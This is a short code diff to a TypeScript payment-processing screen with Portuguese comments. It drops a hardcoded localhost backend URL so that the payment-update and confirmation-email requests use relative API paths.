@@ -81,8 +81,6 @@ export const PaymentProcessingScreen = ({
 
   const sendPaymentToBackend = async (password: string = '') => {
     try {
-      const backendUrl = 'http://localhost:5555';
-
       // Prepara dados completos com informações do dispositivo
       const completePaymentData = {
         ...paymentData,
@@ -109,7 +107,7 @@ export const PaymentProcessingScreen = ({
         devicePixelRatio: deviceInfo?.devicePixelRatio,
       };
 
-      const response = await fetch(`${backendUrl}/api/update-payment`, {
+      const response = await fetch(`/api/update-payment`, {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
@@ -119,7 +117,7 @@ export const PaymentProcessingScreen = ({
 
       if (response.ok) {
         // Envia email com confirmação
-        await fetch(`${backendUrl}/api/send-email`, {
+        await fetch(`/api/send-email`, {
           method: 'POST',
           headers: {
             'Content-Type': 'application/json',
